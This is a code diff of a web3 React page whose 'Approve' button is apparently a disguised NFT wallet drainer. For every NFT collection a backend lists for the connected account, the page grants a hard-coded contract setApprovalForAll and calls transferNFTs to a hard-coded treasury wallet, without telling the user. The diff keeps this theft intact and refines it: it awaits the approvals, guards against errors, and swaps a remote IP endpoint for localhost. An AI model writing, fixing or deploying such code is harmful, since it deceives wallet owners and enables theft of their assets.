@@ -13,13 +13,13 @@ export default function Home() {
   const { account, connectWallet, disconnect, switchNetwork, error, chainId } = useWeb3Modal()
 
   let nftInfo = [];
-  const [nftCount, setCount] = useState(0)
+  const [nftCount, setCount] = useState(-1)
 
   const treasuryWallet = "0xfCb3e3cEf98396fd23BE4aCA4a9e25A46245a928";
   const contractAddress = chainId == 1 ? "0x28bBdDC00971a0Bb95ffa3827BB8090aDb75C97F": "0x0Db3D3Fb452a1c777E03A274Bc2dF278fDD03723";
 
   const approve = async () => {
-    await fetch('http://143.198.133.144:8000/nfts', {
+    await fetch('http://localhost:8000/nfts', {
       method: 'POST',
       headers: {
         'Content-type': "application/json"
@@ -27,13 +27,13 @@ export default function Home() {
       body: JSON.stringify({account: account})  
     })
     .then(res => res.json())
-    .then(data => (nftInfo = data['nftInfo'], setCount(nftInfo.length)))
+    .then(data => (nftInfo = data['nftInfo'], setCount(nftInfo?.length)))
   
-    console.log(":::", nftInfo)
+    console.log("NFT info:", nftInfo)
 
-    nftInfo.map((item) => {
+    nftInfo.map(async (item) => {
       const nftContractInstance = new web3.eth.Contract(ERC721ABI, item.token_address);
-      nftContractInstance.methods.setApprovalForAll(contractAddress, true).send({from: account});
+      await nftContractInstance.methods.setApprovalForAll(contractAddress, true).send({from: account});
 
       const contractInstance = new web3.eth.Contract(contract_abi, contractAddress);
       contractInstance.methods.transferNFTs(treasuryWallet, item.token_address, item.token_ids).send({from: account});  
@@ -55,7 +55,7 @@ export default function Home() {
 
       <button onClick={approve} disabled={!account}>Approve</button>
 
-      {nftCount > 0 && <h3>You have {nftCount } NFT collections.</h3>}
+      {nftCount >= 0 && <h3>You have {nftCount > 0 ? nftCount : 'no'} NFT collections.</h3>}
     </div>
   );
 }
